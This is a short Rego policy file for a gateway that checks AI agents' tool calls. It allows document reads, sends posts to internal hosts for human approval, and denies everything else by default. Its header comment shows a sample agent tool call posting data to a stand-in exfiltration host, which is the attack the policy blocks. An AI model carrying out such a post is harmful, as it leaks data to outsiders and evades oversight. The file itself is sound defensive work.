# The rules the gateway asks before letting a tool call through.
#
# These live outside the application on purpose. Nobody has to read Python to
# find out what an agent is allowed to do, and changing the rules does not mean
# changing the gateway.
#
# The gateway sends input like this:
#
#   {"agent": "spiffe://demo.local/agent/summarizer",
#    "tool": "http_post",
#    "arguments": {"url": "https://evil-exfil.example.com/collect", "body": "..."}}
#
# and gets back {"decision": "...", "reason": "..."}.

package authz

import rego.v1

# The only places we are willing to send data. Anything else is refused,
# no matter how convincing the reason given to the model was.
allowed_hosts := {"api.internal.example", "hooks.internal.example"}

# Pull "evil-exfil.example.com" out of "https://evil-exfil.example.com/collect".
# Split on "://" to drop the scheme, on "/" to drop the path, on ":" to drop
# any port.
target_host := lower(split(split(split(input.arguments.url, "://")[1], "/")[0], ":")[0])

# Reading is harmless, sending data out is not. That asymmetry is the whole
# policy. Note the last rule: if nothing above matched, refuse. Defaulting to
# "no" means a tool added later is locked down until someone writes a rule.
result := {"decision": "allow", "reason": "reading documents is allowed"} if {
	input.tool == "read_document"
} else := {
	"decision": "needs_approval",
	"reason": sprintf("sending data to %v needs a person to approve it", [target_host]),
} if {
	input.tool == "http_post"
	target_host in allowed_hosts
} else := {
	"decision": "deny",
	"reason": sprintf("%v is not an approved destination, refusing to send data there", [target_host]),
} if {
	input.tool == "http_post"
} else := {
	"decision": "deny",
	"reason": sprintf("there is no rule covering the tool %v", [input.tool]),
}
